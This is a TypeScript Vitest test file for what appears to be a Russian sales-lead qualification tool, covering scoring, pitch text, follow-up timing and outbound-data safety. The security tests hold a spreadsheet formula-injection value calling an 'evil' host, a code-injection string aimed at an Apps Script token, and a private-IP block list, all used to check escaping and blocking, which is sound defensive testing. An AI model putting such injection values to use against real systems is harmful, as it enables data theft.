import { describe, expect, it } from "vitest";
import { addManualFact, buildCard, flagsFromFactors, isIncomplete, priorityOf, qualifyResultSchema, strategyScore, type QualifyFacts } from "../src/lib/domain/qualify";
import { detectSegment } from "../src/lib/domain/segments";
import { bannedIn, buildPitch, contactLinks, nextFollowUpAt } from "../src/lib/domain/pitch";
import { mergeSettings } from "../src/lib/domain/settings";
import { dayBounds } from "../src/lib/domain/time";
import { isPrivateIp } from "../src/lib/domain/ip";
import { sheetSafe } from "../src/lib/domain/sheet-safe";
import { appsScript } from "../src/lib/domain/apps-script";
import { openRouterProxy, validProxy } from "../src/lib/integrations/openrouter";

describe("прокси OpenRouter из админки", () => {
  it("формат проверяется, пароль допускается, мусор — нет", () => {
    expect(validProxy("http://user:pa55@1.2.3.4:8888")).toBe("http://user:pa55@1.2.3.4:8888");
    expect(validProxy("direct")).toBe("direct");
    expect(validProxy("1.2.3.4:8888")).toBeNull();
    expect(validProxy("socks5://1.2.3.4:1080")).toBeNull();
    expect(validProxy("http://1.2.3.4")).toBeNull();
  });
  it("прокси из админки главнее .env, direct выключает прокси", () => {
    const before = process.env.OPENROUTER_PROXY_URL;
    process.env.OPENROUTER_PROXY_URL = "http://env:1@9.9.9.9:8888";
    expect(openRouterProxy({ proxyUrl: "http://a:b@1.1.1.1:3128" })).toBe("http://a:b@1.1.1.1:3128");
    expect(openRouterProxy({ proxyUrl: "direct" })).toBeUndefined();
    expect(openRouterProxy({})).toBe("http://env:1@9.9.9.9:8888");
    process.env.OPENROUTER_PROXY_URL = before;
  });
});

describe("безопасность исходящих данных", () => {
  it("внутренние адреса не проходят, публичные проходят", () => {
    for (const ip of ["127.0.0.1", "10.1.2.3", "172.20.0.5", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0", "::1", "fd00::1", "fe80::1", "::ffff:127.0.0.1", "::ffff:7f00:1"]) expect(isPrivateIp(ip), ip).toBe(true);
    for (const ip of ["8.8.8.8", "93.184.216.34", "2606:4700::1111"]) expect(isPrivateIp(ip), ip).toBe(false);
  });
  it("формулы из чужих данных экранируются", () => {
    expect(sheetSafe('=IMPORTXML("https://evil";"//a")')).toBe('\'=IMPORTXML("https://evil";"//a")');
    expect(sheetSafe("+7 999")).toBe("'+7 999");
    expect(sheetSafe("Суши Мастер")).toBe("Суши Мастер");
    expect(sheetSafe(146)).toBe(146);
  });
  it("код Apps Script получает токен и экранирует значения сам", () => {
    const code = appsScript("abc123def456ghi789jkl012");
    expect(code).toContain('var TOKEN = "abc123def456ghi789jkl012";');
    expect(code).toContain("function safe(v)");
    expect(code).not.toContain("__TOKEN__");
    expect(appsScript('x"; evil(); "')).toContain('var TOKEN = "xevil";');
  });
});
import { SCENARIOS, checklistFrom, scenarioOf } from "../src/lib/domain/scenarios";
import { SEGMENTS } from "../src/lib/domain/segments";

describe("выдуманные факты не проходят", () => {
  it("«нет сайта» при живом сайте и неверное число отзывов отбрасываются", () => {
    const facts = { ...base, website: "https://sushi.example", websiteStatus: "WEBSITE_EXISTS" };
    const ai = qualifyResultSchema.parse({
      observation: "У вас нет сайта, заказы только по телефону",
      money: { facts: [{ text: "312 отзывов", source: "reviewCount" }, { text: "146 отзывов на картах", source: "reviewCount" }, { text: "Работают в Краснодаре", source: "city" }] },
      chaos: { facts: [{ text: "Нет своего сайта", source: "websiteStatus" }] },
    });
    const card = buildCard(facts, ai);
    expect(card.money.map((item) => item.text)).toEqual(["146 отзывов на картах"]);
    expect(card.chaos).toHaveLength(0);
    expect(card.observation).toBeNull();
    expect(strategyScore(card, ai).ready).toBe(false);
  });
});

describe("реальные данные парсера", () => {
  it("сайт на clients.site — это хаос, а карточка Unknown без контактов — неполная", () => {
    const facts = { ...base, website: "https://batja-nakormit.clients.site/", websiteStatus: "WEBSITE_EXISTS", reviewCount: null };
    const card = buildCard(facts, null);
    expect(card.chaos[0].text).toContain("clients.site");
    expect(isIncomplete({ ...base, name: "Unknown" })).toBe(true);
    expect(isIncomplete({ ...base, phones: [], website: null })).toBe(true);
    expect(isIncomplete(base)).toBe(false);
  });
});

describe("ручная проверка карточки", () => {
  it("человек подтверждает деньги — карточка C становится готовой", () => {
    const card = buildCard({ ...base, reviewCount: 12, websiteStatus: "SOCIAL_ONLY", website: "https://vk.com/sushi" }, null);
    expect(card.chaos[0].text).toContain("соцсети");
    const before = strategyScore(card, null);
    expect(before.ready).toBe(false);
    const after = strategyScore(addManualFact(card, "money", "2 филиала"), flagsFromFactors(before.factors));
    expect(after.ready).toBe(true);
    expect(["A", "B"]).toContain(after.priority);
    expect(addManualFact(card, "money", "  ").money).toHaveLength(0);
  });
});

describe("время", () => {
  it("сутки считаются по Москве, а не по UTC", () => {
    // 22:30 UTC 23 ноября = 01:30 МСК 24 ноября
    const { start, end } = dayBounds("Europe/Moscow", new Date("2026-11-23T22:30:00Z"));
    expect(start.toISOString()).toBe("2026-11-23T21:00:00.000Z");
    expect(end.toISOString()).toBe("2026-11-24T20:59:59.999Z");
  });
});

describe("сценарии", () => {
  it("на каждый сегмент есть сценарий с этапами", () => {
    for (const segment of SEGMENTS) expect(scenarioOf(segment.id)?.stages.length).toBeGreaterThan(3);
    expect(SCENARIOS).toHaveLength(SEGMENTS.length);
    expect(checklistFrom(scenarioOf("A1"))[0]).toEqual({ id: "s1", title: "Бриф и доступы", done: false });
  });
});

const base: QualifyFacts = {
  name: "Суши Мастер",
  category: "Доставка еды и обедов",
  categories: ["Суши-бар"],
  city: "Краснодар",
  address: "ул. Красная, 1",
  website: null,
  websiteStatus: "NO_WEBSITE",
  rating: 4.7,
  reviewCount: 146,
  photoCount: 12,
  services: [],
  features: [],
  description: null,
  sourceUrl: "https://yandex.ru/maps/org/1",
  phones: ["+79990001122"],
  emails: [],
  socials: [],
};

describe("сегменты", () => {
  it("узнаёт доставку и автосервис по категории", () => {
    expect(detectSegment("Доставка еды и обедов")).toBe("A1");
    expect(detectSegment("Автосервис, автотехцентр")).toBe("A2");
    expect(detectSegment("Натяжные потолки")).toBe("A3");
    expect(detectSegment("Библиотека")).toBeNull();
  });
});

describe("карточка наблюдения и скоринг", () => {
  it("без AI собирает факты из данных: 146 отзывов и нет сайта", () => {
    const card = buildCard(base, null);
    expect(card.segment).toBe("A1");
    expect(card.money.map((item) => item.text)).toContain("146 отзывов");
    expect(card.chaos[0].source).toBe("websiteStatus");
    expect(card.caseRef).toBe("Доставка, Ростов");
    const scored = strategyScore(card, null);
    // деньги 30 + хаос 25 + повторяемость по нише 15 + контакт 15 + кейс 10
    expect(scored.score).toBe(95);
    expect(scored.ready).toBe(true);
    expect(scored.priority).toBe("A");
  });

  it("отбрасывает факты AI со ссылкой на пустое или несуществующее поле", () => {
    const ai = qualifyResultSchema.parse({
      money: { facts: [{ text: "3 филиала", source: "branches" }, { text: "Дорогое меню", source: "description" }] },
      chaos: { facts: [{ text: "Заказы только по телефону", source: "phones" }] },
      growth: { facts: [] },
    });
    const card = buildCard({ ...base, reviewCount: 10 }, ai);
    expect(card.money).toHaveLength(0);
    expect(card.chaos.map((item) => item.text)).toContain("Заказы только по телефону");
  });

  it("стоп-правило: без факта денег карточка не выше C", () => {
    const card = buildCard({ ...base, reviewCount: 5 }, null);
    const scored = strategyScore(card, qualifyResultSchema.parse({ repeatable: true }));
    expect(scored.ready).toBe(false);
    expect(["C", "D"]).toContain(scored.priority);
  });

  it("штрафы: хороший сайт и нерелевант", () => {
    const card = buildCard(base, null);
    const scored = strategyScore(card, qualifyResultSchema.parse({ goodSiteAlready: true, irrelevant: true, repeatable: false }));
    // 30 + 25 + 15 + 10 − 40 − 50 → ниже нуля, балл не уходит в минус
    expect(scored.score).toBe(0);
    expect(scored.priority).toBe("D");
  });

  it("границы приоритетов", () => {
    expect(priorityOf(75, true)).toBe("A");
    expect(priorityOf(74, true)).toBe("B");
    expect(priorityOf(60, true)).toBe("B");
    expect(priorityOf(90, false)).toBe("C");
    expect(priorityOf(39, true)).toBe("D");
  });

  it("расчёт потерь — оценка с суммой", () => {
    const card = buildCard(base, qualifyResultSchema.parse({ avgCheckRub: 1500, lostPerMonth: 20 }));
    expect(card.calc?.lostRub).toBe(30000);
    expect(card.calc?.text).toContain("оценка");
  });
});

describe("питч", () => {
  it("строится из факта и не содержит запрещённых фраз", () => {
    const card = buildCard(base, qualifyResultSchema.parse({ observation: "Заказы принимаете только по телефону, сайта нет.", avgCheckRub: 1500, lostPerMonth: 20 }));
    const text = buildPitch(card);
    expect(text).toContain("Увидел, что заказы принимаете только по телефону, сайта нет. Верно?");
    // Оценка потерь — догадка модели, в текст сообщения она не попадает.
    expect(text).not.toContain("₽");
    expect(bannedIn(text)).toEqual([]);
  });

  it("ловит запрещённые фразы", () => {
    expect(bannedIn("Здравствуйте! Мы делаем сайты и AI-агентов")).toEqual(["мы делаем сайты", "делаем сайты", "ai-агент"]);
  });

  it("ссылки для ручной отправки", () => {
    const links = contactLinks(
      [
        { kind: "phone", value: "8 (999) 000-11-22" },
        { kind: "social", value: "https://t.me/sushimaster" },
        { kind: "social", value: "https://vk.com/sushimaster?w=wall" },
      ],
      "Привет",
    );
    expect(links.find((item) => item.kind === "whatsapp")?.href).toBe("https://wa.me/79990001122?text=%D0%9F%D1%80%D0%B8%D0%B2%D0%B5%D1%82");
    expect(links.find((item) => item.kind === "telegram")?.href).toBe("https://t.me/sushimaster");
    expect(links.find((item) => item.kind === "vk")?.href).toBe("https://vk.me/sushimaster");
  });

  it("follow-up D+3, D+7, D+14, потом конец", () => {
    const sent = new Date("2026-11-23T10:00:00Z");
    expect(nextFollowUpAt(sent, 0)?.toISOString()).toBe("2026-11-26T10:00:00.000Z");
    expect(nextFollowUpAt(sent, 1)?.toISOString()).toBe("2026-11-30T10:00:00.000Z");
    expect(nextFollowUpAt(sent, 2)?.toISOString()).toBe("2026-12-07T10:00:00.000Z");
    expect(nextFollowUpAt(sent, 3)).toBeNull();
  });
});

describe("настройки охоты", () => {
  it("по умолчанию активный контур и лимит 25, мусор отбрасывается", () => {
    expect(mergeSettings({}).hunt).toEqual({ activeSegments: ["A1", "A2", "B1"], dailyLimit: 25, autoQualify: true, autoQualifyMax: 60, timezone: "Europe/Moscow", projectWebhookUrl: "", sheetUrl: "" });
    expect(mergeSettings({ hunt: { timezone: "Mars/Olympus", projectWebhookUrl: "http://10.0.0.1/x" } }).hunt.timezone).toBe("Europe/Moscow");
    expect(mergeSettings({ hunt: { projectWebhookUrl: "http://example.com" } }).hunt.projectWebhookUrl).toBe("");
    expect(mergeSettings({ hunt: { activeSegments: ["A5", "ZZ"], dailyLimit: 9999 } }).hunt.activeSegments).toEqual(["A5"]);
    expect(mergeSettings({ hunt: { dailyLimit: 9999 } }).hunt.dailyLimit).toBe(25);
  });
});
